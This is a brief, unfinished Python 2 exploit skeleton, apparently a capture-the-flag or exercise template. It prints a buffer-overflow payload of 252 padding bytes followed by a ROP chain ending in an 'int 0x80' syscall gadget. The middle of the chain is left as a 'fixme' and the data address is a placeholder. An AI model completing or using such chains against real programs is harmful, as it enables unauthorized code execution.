#!/usr/bin/env python

from struct import pack
 
junk = "A" * 252

data = 0xFFFFFFFF

## ROP gadgets ##
p = ''
p += pack('<I', 0x0806ee2a) # pop edx ; ret
p += pack('<I', data) # @ .data
# fixme : continue the ROP chain
p += pack('<I', 0x080494a1) # int 0x80

payload = junk + p
print payload
